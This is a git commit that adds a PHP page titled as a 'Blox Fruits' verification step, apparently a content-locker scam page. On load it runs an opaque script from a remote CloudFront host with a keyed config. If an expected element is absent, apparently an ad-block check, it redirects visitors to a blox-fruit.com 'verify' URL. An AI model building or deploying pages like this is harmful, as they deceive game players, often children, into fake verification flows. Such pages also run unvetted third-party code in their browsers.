b04cd24bb7919305718fb1619a1e38688ab794b5
Sergey Fortuna <serdiukgalina@mail.ru>
2025-09-19 06:51:57 +0700

    2updFix7

---
+++ verification.php
@@ -0,0 +1,26 @@
+<?php
+header('Content-Type: text/html; charset=utf-8');
+?>
+<!DOCTYPE html>
+<head>
+    <meta charset="UTF-8">
+    <title>Blox Fruits - Verification required</title>
+    <script type="text/javascript">
+        var qCOLw_qtk_YRlUlc = {"it":4453512,"key":"22df5"};
+    </script>
+    <script src="https://d29gqhzevia104.cloudfront.net/611fe8a.js"></script>
+    <script>_FD();</script>
+</head>
+<body>
+    
+<script src="/cpmbanners.js" type="text/javascript"></script>
+<script type="text/javascript">
+
+if(!document.getElementById('UEfFLgshpGzl')){
+  window.location.href = "https://blox-fruit.com/verify.php?u=/cl/i/qkpmww";
+}
+
+</script>
+
+</body>
+</html>
